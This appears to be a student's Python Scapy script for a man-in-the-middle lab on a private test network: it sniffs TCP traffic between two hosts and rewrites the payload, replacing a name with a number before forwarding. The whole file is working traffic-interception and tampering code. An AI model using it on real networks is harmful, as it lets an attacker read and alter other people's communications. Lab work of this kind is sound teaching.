#!/usr/bin/env python3
from scapy.all import *
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
IP_ATC = "10.9.0.105"
MAC_ATC = "02:42:0a:09:00:69"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[Ether].src == MAC_A and pkt[Ether].dst == MAC_ATC:
        # print(pkt[Ether].src, pkt[Ether].dst)
        # print(pkt[Ether].src == MAC_A , pkt[Ether].dst == MAC_B)
    # Create a new packet based on the captured one.
    # 1) We need to delete the checksum in the IP & TCP headers,
    #
    # because our modification will make them invalid.
    #
    # Scapy will recalculate them if these fields are missing.
    # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
    #################################################################
    # Construct the new payload based on the old payload.
    # Students need to implement this part.
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load # The original payload data
            
            # print("printing data")
            # print(type(data))
            # print(data)
            # print(len(data))
            dataStr = data.decode("utf-8")
            print(dataStr)
            newData = data
            if("Raihan Rasheed" in dataStr):
                print('Raihan Rasheed found')
                print(type(dataStr))
                print(dataStr)
                newData = dataStr.replace("Raihan Rasheed","16050621605062")
                
            # newData = ''
            # vowels  = ['a','e','i','o','u']
            # for c in data:
            #     if chr(c) in vowels:
            #         newData += 'Z'
            #     else:
            #         # print(type(c))
            #         newData += chr(c)
            print('data length: ',len(data))
            print('data sniffed: ',data)
            print('data sent: ',newData)
            
            
            # No change is made in this sample code
            newpkt  = newpkt/newData
            newpkt.show()
            send(newpkt)
        else:
            send(newpkt)
    ################################################################
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A and pkt[Ether].src == MAC_B and pkt[Ether].dst == MAC_ATC:
    # Create new packet based on the captured one
    # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)


f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)

